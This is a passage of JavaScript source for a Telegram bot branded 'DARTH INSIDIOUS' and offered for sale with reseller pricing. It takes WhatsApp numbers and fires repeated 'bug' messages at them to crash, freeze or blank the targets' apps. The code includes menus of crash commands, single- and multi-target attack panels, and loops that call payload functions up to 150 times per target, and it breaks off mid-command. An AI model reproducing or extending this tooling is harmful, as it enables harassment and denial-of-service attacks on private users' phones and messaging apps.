        reply_markup: getButtons(currentPage)
    });
});

bot.action(/next_(\d+)/, async (ctx) => {
    if (!OWNER_IDS.includes(String(ctx.from.id))) {
        return ctx.answerCbQuery("❌ Akses ditolak!");
    }
    const page = parseInt(ctx.match[1]);
    const totalPages = Math.ceil(userStart.length / perPage);
    if (page < totalPages) {
        currentPage = page + 1;
        await ctx.editMessageText(getText(currentPage), {
            parse_mode: "HTML",
            reply_markup: getButtons(currentPage)
        });
    }
    ctx.answerCbQuery();
});

bot.action(/prev_(\d+)/, async (ctx) => {
    if (!OWNER_IDS.includes(String(ctx.from.id))) {
        return ctx.answerCbQuery("❌ Akses ditolak!");
    }
    const page = parseInt(ctx.match[1]);
    if (page > 1) {
        currentPage = page - 1;
        await ctx.editMessageText(getText(currentPage), {
            parse_mode: "HTML",
            reply_markup: getButtons(currentPage)
        });
    }
    ctx.answerCbQuery();
});

bot.action("hargaa", async (ctx) => {
    const userId = ctx.from.id.toString();
    stopAutoWarna(userId);

    const toolsMessage = `
<blockquote><strong>DARTH INSIDIOUS</strong></blockquote>

<blockquote><strong>HARGA SCRIPT ?</strong></blockquote>
FULL UP : 5k
RESELLER : 10k
PARTNER : 17k
MODERATOR : 24k
CEO : 30k
<blockquote><strong>DARTH INSIDIOUS</strong></blockquote>
`;

    const media = {
        type: "photo",
        media: getRandomImage(),
        caption: toolsMessage,
        parse_mode: "HTML"
    };

    const toolsKeyboard = [
        [{ text: "BUY", url: "https://t.me/dickxmod" }],
        [{ text: "🔙 Kembali", callback_data: "back" }]
    ];

    try {
        await ctx.editMessageMedia(media, { 
            reply_markup: { 
                inline_keyboard: toolsKeyboard 
            } 
        });
    } catch (err) {
        await ctx.replyWithPhoto(media.media, {
            caption: media.caption,
            parse_mode: media.parse_mode,
            reply_markup: { inline_keyboard: toolsKeyboard },
        });
    }
});

bot.action("all_menu", async (ctx) => {
const userId = ctx.from.id.toString();
    stopAutoWarna(userId);
const senderId = ctx.from.id;
const username = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
    const userIdStr = ctx.from.id.toString();
    const premiumStatus = premiumUsers.includes(userIdStr) ? "✅ Ya" : "❌ No";
    const waStatus = sock && sock.user ? "✅ Terhubung" : "❌ Tidak Terhubung";
    
    const allMenuMessage = `
<blockquote><strong>DARTH INSIDIOUS</strong></blockquote>
⎔ Developer: @dickxmod
⎔ Version: 2 Private Series   
⎔ Platform: Telegram
⎔ Type Script: Special Edition 
<blockquote><strong>𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍</strong></blockquote>
⎔ Id: ${senderId}
⎔ Username: ${username}
⎔ Premium : ${premiumStatus}  
⎔ Sender Status : ${waStatus}
<blockquote><strong>𝐂⦿𝐍𝐓𝐑𝐎𝐋</strong></blockquote>
• /update
• /addadmin
• /deladmin
• /Status
• /addsender
• /delsesi
• /addprem 
• /delprem 
<blockquote><strong>𝐂𝐔𝐒𝐓⦿𝐌 𝐁𝐔𝐆</strong></blockquote>
☇ - /custombug1 ᝄ 628xx ( Custom Bug New V1 )
☇ - /custombug2 ᝄ 628xx ( Custom Bug New V2 )
<blockquote><strong>𝐒𝐏𝐄𝐂𝐈𝐀𝐋 𝐁𝐔𝐆</strong></blockquote>
☇ - /attack ᝄ 628xx ( Select Button Bug )
<blockquote><strong>𝐀𝐍𝐃𝐑𝐎 𝐁𝐔𝐆𝐒</strong></blockquote>
☇ - /crashloca ᝄ 628xx ( Crash Location )
☇ - /buldo ᝄ 628xx ( Buldozer )
☇ - /delayhard ᝄ 628xx ( Delay  )
☇ - /blankandro ᝄ 628xx ( Blank Click )
☇ - /blankvideo ᝄ 628xx ( Blank Video )
☇ - /forseclikk ᝄ 628xx ( Force Click )
☇ - /forcloseee ᝄ 628xx ( Force No Click)
<blockquote><strong>DARTH INSIDIOUS</strong></blockquote>
`;

    const media = {
        type: "photo",
        media: getRandomImage(),
        caption: allMenuMessage,
        parse_mode: "HTML"
    };

    const keyboard = {
        inline_keyboard: [
            [{ text: "🔙 KEMBALI", callback_data: "back" }]
        ]
    };

    try {
        await ctx.editMessageMedia(media, { reply_markup: keyboard });
    } catch (err) {
        await ctx.replyWithPhoto(media.media, {
            caption: media.caption,
            parse_mode: media.parse_mode,
            reply_markup: keyboard,
        });
    }
});

bot.action("bug_menu", async (ctx) => {
const userId = ctx.from.id.toString();
    stopAutoWarna(userId);
const senderId = ctx.from.id;
const username = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
const userIdStr = ctx.from.id.toString();
const premiumStatus = premiumUsers.includes(userIdStr) ? "✅ Ya" : "❌ No";
    const waStatus = sock && sock.user ? "✅ Terhubung" : "❌ Tidak Terhubung";
    
    const bugMenuMessage = `
<blockquote><strong>DARTH INSIDIOUS</strong></blockquote>
⎔ Developer: @dickxmod
⎔ Version: 2 Private Series   
⎔ Platform: Telegram
⎔ Type Script: Special Edition 
<blockquote><strong>𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍</strong></blockquote>
⎔ Id: ${senderId}
⎔ Username: ${username}
⎔ Premium : ${premiumStatus}  
⎔ Sender Status : ${waStatus}
<blockquote><strong>𝐒𝐏𝐄𝐂𝐈𝐀𝐋 𝐁𝐔𝐆</strong></blockquote>
☇ - /attack ᝄ 628xx ( Select Button Bug )
<blockquote><strong>𝐀𝐍𝐃𝐑𝐎 𝐁𝐔𝐆𝐒</strong></blockquote>
☇ - /crashloca ᝄ 628xx ( Crash Location )
☇ - /buldo ᝄ 628xx ( Buldozer )
☇ - /delayhard ᝄ 628xx ( Delay Invisible )
☇ - /blankandro ᝄ 628xx ( Blank Click )
☇ - /blankvideo ᝄ 628xx ( Blank Video )
☇ - /forseclikk ᝄ 628xx ( Force Click )
☇ - /forcloseee ᝄ 628xx ( Force No Click )
<blockquote><strong>DARTH INSIDIOUS</strong></blockquote>
`;

    const media = {
        type: "photo",
        media: getRandomImage(),
        caption: bugMenuMessage,
        parse_mode: "HTML"
    };

    const keyboard = {
        inline_keyboard: [
            [{ text: "🔙 KEMBALI", callback_data: "back" }]
        ]
    };

    try {
        await ctx.editMessageMedia(media, { reply_markup: keyboard });
    } catch (err) {
        await ctx.replyWithPhoto(media.media, {
            caption: media.caption,
            parse_mode: media.parse_mode,
            reply_markup: keyboard,
        });
    }
});

bot.action("bug_custom", async (ctx) => {
const userId = ctx.from.id.toString();
    stopAutoWarna(userId);
const senderId = ctx.from.id;
const username = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
const userIdStr = ctx.from.id.toString();
const premiumStatus = premiumUsers.includes(userIdStr) ? "✅ Ya" : "❌ No";
    const waStatus = sock && sock.user ? "✅ Terhubung" : "❌ Tidak Terhubung";
    
    const customBugMessage = `
<blockquote><strong>DARTH INSIDIOUS</strong></blockquote>
⎔ Developer: @dickxmod
⎔ Version: 2 Private Series   
⎔ Platform: Telegram
⎔ Type Script: Special Edition 
<blockquote><strong>𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍</strong></blockquote>
⎔ Id: ${senderId}
⎔ Username: ${username}
⎔ Premium : ${premiumStatus}  
⎔ Sender Status : ${waStatus}
<blockquote><strong>𝐂𝐔𝐒𝐓⦿𝐌 𝐁𝐔𝐆</strong></blockquote>
☇ - /custombug1 ᝄ 628xx ( Custom Bug New V1 )
☇ - /custombug2 ᝄ 628xx ( Custom Bug New V2 )
<blockquote><strong>DARTH INSIDIOUS</strong></blockquote>
`;

    const media = {
        type: "photo",
        media: getRandomImage(),
        caption: customBugMessage,
        parse_mode: "HTML"
    };

    const keyboard = {
        inline_keyboard: [
            [{ text: "🔙 KEMBALI", callback_data: "back" }]
        ]
    };

    try {
        await ctx.editMessageMedia(media, { reply_markup: keyboard });
    } catch (err) {
        await ctx.replyWithPhoto(media.media, {
            caption: media.caption,
            parse_mode: media.parse_mode,
            reply_markup: keyboard,
        });
    }
});

// CUSTOMBUG 3
// ========== COMMAND CUSTOMBUG1 ==========
// ===== COMMAND =====
// ===== HANDLER BUKA MENU =====
bot.command("custombug2", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("Example: /custombug2 62xxx,62xxx");

  const numbers = q.split(",")
    .map(v => v.replace(/[^0-9]/g, ''))
    .filter(v => v.length > 5);

  if (!numbers.length) return ctx.reply("❌ Nomor tidak valid");

  const targets = numbers.map(v => `${v}@s.whatsapp.net`);

  multiBugSession.set(ctx.from.id, {
    targets,
    numbers,
    selected: []
  });

  await ctx.replyWithPhoto("https://gangalink.vercel.app/i/d8ght5mj", {
    caption: `⚡ *MULTI BUG PANEL*\n\n🎯 Target (${numbers.length}):\n${numbers.map(v => `• ${v}`).join("\n")}\n\nPilih bug lalu tekan EXECUTE`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: buildButtons(ctx.from.id)
    }
  });
});

// ===== BUTTON =====
function buildButtons(userId) {
  const s = multiBugSession.get(userId);
  const isOn = (b) => s.selected.includes(b) ? "⭐" : "⬜";

  const btn = (b, name) => ({
    text: `${isOn(b)} ${name}`,
    callback_data: `cb3bug|${b}` // 🔥 prefix unik
  });

  return [
    [btn("forceclick","FORCECLICK"), btn("delay","DELAY"), btn("blank","BLANK")],
    [btn("fcnoclikkk","FCNOCLIK"), btn("buldo","BULLDO"), btn("video","VIDEO")],
    //[btn("ui","UI"), btn("lmsg","1 MSG"), btn("visible","VISIBLE")],
    //[btn("lckchat","LOCK CHAT"), btn("locaui","LOCA UI"), btn("imageui","IMAGE UI")],
    //[btn("iosui","IOS UI"), btn("ios","IOS"), btn("drain","DRAIN")],
    [
      { text: "🚀 EXECUTE", callback_data: "cb3bug|exec" }
    ]
  ];
}

// ===== UPDATE =====
async function updateMulti(ctx) {
  await ctx.telegram.editMessageReplyMarkup(
    ctx.callbackQuery.message.chat.id,
    ctx.callbackQuery.message.message_id,
    null,
    {
      inline_keyboard: buildButtons(ctx.from.id)
    }
  );
}

bot.action(/^cb3bug\|([^|]+)$/, async (ctx) => {
  const key = ctx.match[1];
  const s = multiBugSession.get(ctx.from.id);

  if (!s) return ctx.answerCbQuery("Session expired");

  // ===== EXECUTE =====
  if (key === "exec") {

    if (!s.selected.length) {
      return ctx.answerCbQuery("❌ Pilih bug!", { show_alert: true });
    }

    await ctx.answerCbQuery();

    // Buat daftar bug yang dipilih
    const bugList = s.selected.map(b => {
      if (b === "ios") return "IOS CRASH";
      if (b === "delay") return "DELAY";
      if (b === "video") return "VIDEO BLANK";
      if (b === "drain") return "DRAIN";
      if (b === "buldo") return "BULLDOZER";
      if (b === "ui") return "UI OVERLOAD";
      if (b === "blank") return "BLANK";
      if (b === "lmsg") return "LMSG";
      if (b === "visible") return "VISIBLE";
      if (b === "lckchat") return "LOCK CHAT";
      if (b === "locaui") return "LOCA UI";
      if (b === "imageui") return "IMAGE FREEZE";
      if (b === "iosui") return "IOS UI";
      if (b === "forceclick") return "FORCE CLICK";
      if (b === "fcnoclikkk") return "FC NOCLICK";
      return b.toUpperCase();
    }).join(", ");

    // === LANGSUNG EDIT CAPTION JADI ATTACK FINISHED ===
    await ctx.editMessageCaption(
      `✅ *ATTACK FINISHED!*\n\n` +
      `📦 Bug: ${bugList}\n` +
      `🎯 Target: ${s.targets.length} nomor\n` +
      `⚡ Status: SUCCESS`,
      { parse_mode: "Markdown" }
    );

    try {
      // Jalankan semua bug yang dipilih
      for (const target of s.targets) {
        for (const bug of s.selected) {

          if (bug === "ios") {
            for (let i = 0; i < 100; i++) {
              await NewlasterFollCrashIos(sock, target);
              await sleep(1000);
            }
          }
          else if (bug === "delay") {
            for (let i = 0; i < 50; i++) {
              await comboVnxz(sock, target, ptcp = false);
              await sleep(2000);
            }
          }
          else if (bug === "video") {
            for (let i = 0; i < 20; i++) {
              await videoblankui(sock, target);
              await sleep(1500);
            }
          }
          else if (bug === "drain") {
            for (let i = 0; i < 150; i++) {
              await BuldozerNoDelay(sock, target);
              await sleep(3000);
            }
          }
          else if (bug === "buldo") {
            for (let i = 0; i < 150; i++) {
              await BuldozerNoDelay(sock, target);
              await sleep(3000);
            }
          }
          else if (bug === "ui") {
            for (let i = 0; i < 100; i++) {
              await SennUiOverload(target);
              await sleep(1000);
            }
          }
          else if (bug === "blank") {
            await blankuiiiiii(sock, target);
          }
          else if (bug === "lmsg") {
            await blankuiiiiii(sock, target);
          }
          else if (bug === "visible") {
            for (let i = 0; i < 50; i++) {
              await comboVnxz(sock, target, ptcp = false);
              await sleep(2000);
            }
          }
          else if (bug === "lckchat") {
            await VnXLockChat(sock, target);
          }
          else if (bug === "locaui") {
            await LocationUi(sock, target);
          }
          else if (bug === "imageui") {
            await ImageFrezeeUi(sock, target);
          }
          else if (bug === "iosui") {
            await SennUiOverload(target);
          }
          else if (bug === "forceclick") {
            await fcclick(sock, target);
          }
          else if (bug === "fcnoclikkk") {
            for (let i = 0; i < 100; i++) {
              await sendAlbumMessage(sock, target);
              await sleep(5000);
            }
          }
        }
        await sleep(1500);
      }

      // ========== SELESAI ==========
      // Caption sudah ATTACK FINISHED dari awal, tidak perlu diubah lagi

    } catch (err) {
      console.error(err);
      // Jika error, ubah caption dari "ATTACK FINISHED" jadi pesan error
      await ctx.editMessageCaption(
        `❌ *ERROR!*\n\n` +
        `📦 Bug: ${bugList}\n` +
        `🎯 Target: ${s.targets.length} nomor\n` +
        `⚠️ ${err.message}`,
        { parse_mode: "Markdown" }
      );
    }

    return;
  }

  // ===== TOGGLE =====
  const i = s.selected.indexOf(key);

  if (i > -1) s.selected.splice(i, 1);
  else s.selected.push(key);

  await updateMulti(ctx);
  await ctx.answerCbQuery(`${key.toUpperCase()} ${i > -1 ? "OFF" : "ON"} ⭐`);
});
// CUSTOMBUG 2
// ===== PAGE DATA (UPGRADE JADI 5 PAGE) =====
const togglePages = {
  1: ["forceclick", "delay", "blank"],
  2: ["fcnoclikkk", "buldo", "video"],
  //3: ["lmsg", "visible", "lckchat"],
  //4: ["locaui", "imageui", "iosui"],
  //5: ["ios", "drain", "ui"]
};

bot.command("custombug1", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const args = ctx.message.text.split(" ");
  const q = args[1];
  if (!q) return ctx.reply("Example: /custombug1 62xxx");

  const cleanNumber = q.replace(/\D/g, "");
  const finalNumber = `${cleanNumber}@s.whatsapp.net`;

  attackConfig.set(ctx.from.id, {
    target: finalNumber,
    number: cleanNumber,
    page: 1,

    //ios: false,
    delay: false,
    video: false,
    //drain: false,
    buldo: false,
    //ui: false,

    //lmsg: false,
    //visible: false,
    //lckchat: false,
    //locaui: false,
    //imageui: false,
    //iosui: false,
    forceclick: false,
    fcnoclikkk: false,
    blank: false
  });

  const s = attackConfig.get(ctx.from.id);

  await ctx.replyWithPhoto("https://gangalink.vercel.app/i/d8ght5mj", {
    caption: formatPanel(s),
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: buildMenu(s)
    }
  });
});

// ===== FORMAT =====
function formatPanel(s) {
  const icon = (v) => v ? "⭐" : "⬜";

  return `⚡ *ATTACK CONTROL PANEL* ⚡\n\n` +
         `📄 Page : ${s.page}/2\n\n` +

         `🔥 STATUS\n` +
         //`• IOS       : ${icon(s.ios)}\n` +
         `• DELAY     : ${icon(s.delay)}\n` +
         `• VIDEO     : ${icon(s.video)}\n` +
         //`• DRAIN     : ${icon(s.drain)}\n` +
         `• BULLDOZER : ${icon(s.buldo)}\n` +
         //`• UI        : ${icon(s.ui)}\n` +
         //`• 1 MSG     : ${icon(s.lmsg)}\n` +
         //`• VISIBLE   : ${icon(s.visible)}\n` +
         //`• LOCKCHAT  : ${icon(s.lckchat)}\n` +
         //`• LOCA UI   : ${icon(s.locaui)}\n` +
         //`• IMAGE UI  : ${icon(s.imageui)}\n` +
         //`• IOS UI    : ${icon(s.iosui)}\n` +
         `• FORCECLICK       : ${icon(s.forceclick)}\n` +
         `• FCNOCLICK     : ${icon(s.fcnoclikkk)}\n` +
         `• BLANK     : ${icon(s.blank)}\n`;
}

// ===== BUTTON =====
function buildMenu(s) {
  const btn = (key) => ({
    text: `${s[key] ? "⭐" : "⬜"} ${key.toUpperCase()}`,
    callback_data: `toggle_${key}`
  });

  const current = togglePages[s.page];
  const keyboard = [];

  for (let i = 0; i < current.length; i += 2) {
    const row = [];
    row.push(btn(current[i]));
    if (current[i + 1]) row.push(btn(current[i + 1]));
    keyboard.push(row);
  }

  keyboard.push([
    { text: "⬅️", callback_data: `custombug1_page_${s.page - 1}:${s.target}` },
    { text: `📄 ${s.page}/2`, callback_data: "noop" },
    { text: "➡️", callback_data: `custombug1_page_${s.page + 1}:${s.target}` }
  ]);

  keyboard.push([
    { text: "🚀 EXECUTE", callback_data: `custombug1_exec:${s.target}` }
  ]);

  return keyboard;
}

// ===== UPDATE =====
async function update(ctx, s) {
  await ctx.telegram.editMessageCaption(
    ctx.callbackQuery.message.chat.id,
    ctx.callbackQuery.message.message_id,
    null,
    formatPanel(s),
    {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: buildMenu(s)
      }
    }
  );
}

// ===== TOGGLE =====
bot.action(/^toggle_(.+)$/, async (ctx) => {
  const key = ctx.match[1];
  const s = attackConfig.get(ctx.from.id);
  if (!s) return ctx.answerCbQuery("Session expired");

  if (!(key in s)) return ctx.answerCbQuery("Invalid");

  s[key] = !s[key];

  await update(ctx, s);
  await ctx.answerCbQuery(`${key.toUpperCase()} ${s[key] ? "ON ⭐" : "OFF"}`);
});

// ===== SLIDE =====
bot.action(/^custombug1_page_(\d+):(.+)$/, async (ctx) => {
  const page = parseInt(ctx.match[1]);
  const s = attackConfig.get(ctx.from.id);
  if (!s) return ctx.answerCbQuery("Session expired");

  if (page < 1 || page > 5) return ctx.answerCbQuery();

  s.page = page;

  await update(ctx, s);
  await ctx.answerCbQuery(`Page ${page}`);
});

bot.action(/^custombug1_exec:(.+)$/, async (ctx) => {
  const target = ctx.match[1];
  const s = attackConfig.get(ctx.from.id);
  if (!s) return ctx.answerCbQuery("Session expired");

  await ctx.answerCbQuery();

  // Buat daftar bug yang dipilih
  const getSelectedBugs = () => {
    const bugs = [];
    if (s.ios) bugs.push("IOS CRASH");
    if (s.delay) bugs.push("DELAY");
    if (s.video) bugs.push("VIDEO BLANK");
    if (s.drain) bugs.push("DRAIN");
    if (s.buldo) bugs.push("BULLDOZER");
    if (s.ui) bugs.push("UI OVERLOAD");
    if (s.lmsg) bugs.push("LMSG");
    if (s.visible) bugs.push("VISIBLE");
    if (s.lckchat) bugs.push("LOCK CHAT");
    if (s.locaui) bugs.push("LOCA UI");
    if (s.imageui) bugs.push("IMAGE FREEZE");
    if (s.iosui) bugs.push("IOS UI");
    if (s.forceclick) bugs.push("FORCE CLICK");
    if (s.fcnoclikkk) bugs.push("FC NOCLICK");
    if (s.blank) bugs.push("BLANK");
    return bugs.join(", ");
  };

  const selectedBugs = getSelectedBugs();

  // === LANGSUNG EDIT CAPTION JADI ATTACK FINISHED ===
  await ctx.editMessageCaption(
    `✅ *ATTACK FINISHED!*\n\n` +
    `📦 Bug: ${selectedBugs}\n` +
    `🎯 Target: ${target}\n` +
    `⚡ Status: SUCCESS`,
    { parse_mode: "Markdown" }
  );

  try {
    // ========== IOS ==========
    if (s.ios) {
      for (let i = 0; i < 100; i++) {
        await NewlasterFollCrashIos(sock, target);
        await sleep(1000);
      }
    }

    // ========== DELAY ==========
    if (s.delay) {
      for (let i = 0; i < 50; i++) {
        await comboVnxz(sock, target, ptcp = false);
        await sleep(1000);
      }
    }

    // ========== VIDEO ==========
    if (s.video) {
      for (let i = 0; i < 40; i++) {
        await videoblankui(sock, target);
        await sleep(1500);
      }
    }

    // ========== DRAIN ==========
    if (s.drain) {
      for (let i = 0; i < 150; i++) {
        await BuldozerNoDelay(sock, target);
        await sleep(3000);
      }
    }

    // ========== BULLDOZER ==========
    if (s.buldo) {
      for (let i = 0; i < 150; i++) {
        await BuldozerNoDelay(sock, target);
        await sleep(3000);
      }
    }

    // ========== UI OVERLOAD ==========
    if (s.ui) {
      for (let i = 0; i < 100; i++) {
        await SennUiOverload(target);
        await sleep(1000);
      }
    }

    // ========== LMSG ==========
    if (s.lmsg) {
      for (let i = 0; i < 1; i++) {
        await blankuiiiiii(sock, target);
        await sleep(1000);
      }
    }

    // ========== VISIBLE ==========
    if (s.visible) {
      for (let i = 0; i < 50; i++) {
        await comboVnxz(sock, target, ptcp = false);
        await sleep(1000);
      }
    }

    // ========== LOCK CHAT ==========
    if (s.lckchat) {
      for (let i = 0; i < 50; i++) {
        await VnXLockChat(sock, target);
        await sleep(1000);
      }
    }

    // ========== LOCA UI ==========
    if (s.locaui) {
      for (let i = 0; i < 50; i++) {
        await LocationUi(sock, target);
        await sleep(1000);
      }
    }

    // ========== IMAGE FREEZE ==========
    if (s.imageui) {
      for (let i = 0; i < 50; i++) {
        await ImageFrezeeUi(sock, target);
        await sleep(1000);
      }
    }

    // ========== IOS UI ==========
    if (s.iosui) {
      for (let i = 0; i < 50; i++) {
        await SennUiOverload(target);
        await sleep(1000);
      }
    }

    // ========== FORCE CLICK ==========
    if (s.forceclick) {
      for (let i = 0; i < 1; i++) {
        await fcclick(sock, target);
        await sleep(1000);
      }
    }

    // ========== FC NOCLICK ==========
    if (s.fcnoclikkk) {
      for (let i = 0; i < 100; i++) {
        await sendAlbumMessage(sock, target);
        await sleep(5000);
      }
    }

    // ========== BLANK ==========
    if (s.blank) {
      for (let i = 0; i < 1; i++) {
        await blankuiiiiii(sock, target);
        await sleep(1000);
      }
    }

    // ========== SELESAI ==========
    // Caption sudah ATTACK FINISHED dari awal, tidak perlu diubah lagi

  } catch (err) {
    console.error(err);
    // Jika error, ubah caption dari "ATTACK FINISHED" jadi pesan error
    await ctx.editMessageCaption(
      `❌ *ERROR!*\n\n` +
      `📦 Bug: ${selectedBugs}\n` +
      `🎯 Target: ${target}\n` +
      `⚠️ ${err.message}`,
      { parse_mode: "Markdown" }
    );
  }
});
//////// -- CASE BUG SELECT BUTTON BUG --- \\\\\\\\\\\
let lastTarget = {}; // simpen nomor biar kebaca di action

bot.command("attack", checkWhatsAppConnection, checkPremium, async (ctx) => {

  const chatId = ctx.chat.id;
  
  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";

  const args = ctx.message.text.split(" "); // 🔥 FIX
  const q = args[1];
  if (!q) return ctx.reply("Example: /attack 62xxx");

  const cleanNumber = args[1].replace(/[^0-9]/g, '');
  const finalNumber = `${cleanNumber}@s.whatsapp.net`;

  lastTarget[ctx.from.id] = cleanNumber; // 🔥 simpen

  const waStatus = sock && sock.user
    ? "On Boss"
    : "Ga On Jir"; 

  const caption = `
「©️ @dickxmod 」
⫹⫺ - +${cleanNumber}
⫹⫺ - Date : ${new Date().toLocaleDateString()}
⫹⫺ - Status Sender : ${waStatus}
⫹⫺ - 𝗦𝗘𝗟𝗘𝗖𝗧 𝗧𝗛𝗘 𝗕𝗨𝗧𝗢𝗡 𝗕𝗨𝗚
`;

  const keyboard = {
    reply_markup: {
      inline_keyboard: [
        [
          { text: "𝗙𝗢𝗥𝗖𝗘 𝗖𝗟𝗜𝗖𝗞 👻", callback_data: `attack_fcclik:${finalNumber}` },
          { text: "𝗗𝗘𝗟𝗔𝗬 𝗨𝗜 🧬", callback_data: `attack_delayui:${finalNumber}` }
        ],
        [
          //{ text: "𝗗𝗘𝗟𝗔𝗬 𝗜𝗣𝗛𝗢𝗡𝗘 📱", callback_data: `attack_delayios:${finalNumber}` },
          //{ text: "𝗣𝗥𝗢𝗧𝗢𝗖𝗢𝗟 𝗗𝗘𝗟𝗔𝗬 🫀", callback_data: `attack_chidorkk:${finalNumber}` }
        ],
        [
          { text: "𝗕𝗨𝗟𝗗𝗢𝗭𝗘𝗥 🔥", callback_data: `attack_buldozer:${finalNumber}` },
          { text: "𝗕𝗟𝗔𝗡𝗞 𝗩𝗜𝗗𝗘𝗢 🎁", callback_data: `attack_chidoriii:${finalNumber}` }
        ],
        [
          //{ text: "𝗣𝗥𝗢𝗧𝗢𝗖𝗢𝗟 𝟭𝟭 🗯️", callback_data: `attack_protocoll:${finalNumber}` },
          //{ text: "𝗢𝗩𝗘𝗥𝗟𝗢𝗔𝗗 𝗦𝗬𝗦𝗧𝗘𝗠 🦠", callback_data: `attack_jjmbudd:${finalNumber}` }
        ],
        [
          { text: "𝗙𝗖 𝗡𝗢 𝗖𝗟𝗜𝗖𝗞 👽", callback_data: `attack_fcklikk:${finalNumber}` },
          { text: "𝗖𝗥𝗔𝗦𝗛 𝗟𝗢𝗖𝗔𝗧𝗜𝗢𝗡 💣", callback_data: `attack_uinibos:${finalNumber}` }
        ],
        [
          { text: "𝗕𝗟𝗔𝗡𝗞 𝗨𝗜 🥶", callback_data: `attack_chidoruu:${finalNumber}` }
        ]
      ]
    }
  };

  await ctx.replyWithPhoto("https://gangalink.vercel.app/i/d8ght5mj", {
    caption,
    ...keyboard,
  });
});

bot.action(/^attack_(\w+):(.+)$/, checkPremium, async (ctx) => {
  const bugType = ctx.match[1];
  const target = ctx.match[2];
  const cleanNumber = lastTarget[ctx.from.id];

  await ctx.answerCbQuery();

  // === LANGSUNG EDIT CAPTION JADI ATTACK FINISHED ===
// ✅ BENAR - parse_mode di dalam object yang sama
await ctx.editMessageCaption(
  `✅ *ATTACK FINISHED!*\n\n` +
  `🎯 Target: ${cleanNumber}\n` +
  `⚡ Status: SUCCESS`,
  { parse_mode: "Markdown" }  // <-- PISAH DENGAN KOMA, BUKAN PLUS
);

  try {
    switch (bugType) {
      case "chidorkk":
        for (let i = 0; i < 100; i++) {
          await comboVnxz(sock, target, ptcp = false);
          await sleep(1500);
        }
        break;
      case "delayxinvis":
        for (let i = 0; i < 40; i++) {
          await comboVnxz(sock, target, ptcp = false);
          await sleep(1000);
        }
        break;
      case "chidoriii":
        for (let i = 0; i < 100; i++) {
          await videoblankui(sock, target);
          await sleep(5000);
        }
        break;
      case "chidoruu":
        for (let i = 0; i < 1; i++) {
          await blankuiiiiii(sock, target);
          await sleep(1000);
        }
        break;
      case "protocoll":
      case "buldozer":
        for (let i = 0; i < 150; i++) {
          await BuldozerNoDelay(sock, target);
          await sleep(3000);
        }
        break;
      case "fcklikk":
        for (let i = 0; i < 100; i++) {
          await sendAlbumMessage(sock, target);
          await sleep(1000);
        }
        break;
      case "jjmbudd":
        for (let i = 0; i < 100; i++) {
          await SennUiOverload(target);
          await sleep(1500);
        }
        break;
      case "delayios":
        for (let i = 0; i < 100; i++) {
          await IPhoneDelay(target, true);
          await sleep(1000);
        }
        break;
      case "fcclik":
        for (let i = 0; i < 1; i++) {
          await fcclick(sock, target);
          await sleep(1000);
        }
        break;
      case "delayui":
        for (let i = 0; i < 50; i++) {
          await comboVnxz(sock, target, ptcp = false);
          await sleep(1000);
        }
        break;
      case "poseidon":
        for (let i = 0; i < 50; i++) {
          await comboVnxz(sock, target, ptcp = false);
          await comboVnxz(sock, target, ptcp = false);
          await sleep(1000);
        }
        break;
      case "chidori":
        for (let i = 0; i < 1; i++) {
          await blankuiiiiii(sock, target);
          await sleep(1000);
        }
        break;
      case "uinibos":
        for (let i = 0; i < 30; i++) {
          await LocationUi(sock, target);
          await sleep(8000);
        }
        break;
      default:
        // Jika bug tidak ditemukan, ubah jadi error
        await ctx.editMessageCaption(
          `❌ *ERROR!*\n\nBug tidak ditemukan.`,
          { parse_mode: "Markdown" }
        );
        return;
    }

  } catch (err) {
    console.error(err);
    // Jika proses attack error, ubah caption dari "ATTACK FINISHED" jadi pesan error
    await ctx.editMessageCaption(
      `❌ *ERROR!*\n\n${err.message}`,
      { parse_mode: "Markdown" }
    );
  }
});
//////// -- CASE BUG BIASA --- \\\\\\\\\\\
bot.command("delayhard", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /delayhard 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://gangalink.vercel.app/i/d8ght5mj", {
    caption: `
<blockquote>交DARTH INSIDIOUSᝄ</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /delayhard 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    },
  });

  (async () => {
    for (let i = 0; i < 50; i++) {
      await comboVnxz(sock, target, ptcp = false);
      await sleep(1000);
    }
  })();
});
bot.command("crashloca", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /crashloca 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://gangalink.vercel.app/i/d8ght5mj", {
    caption: `
<blockquote>交DARTH INSIDIOUSᝄ</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /crashloca 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    },
  });

  (async () => {
    for (let i = 0; i < 30; i++) {
      LocationUi(sock, target);
      await sleep(8000);
    }
  })();
});
bot.command("iosattack", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
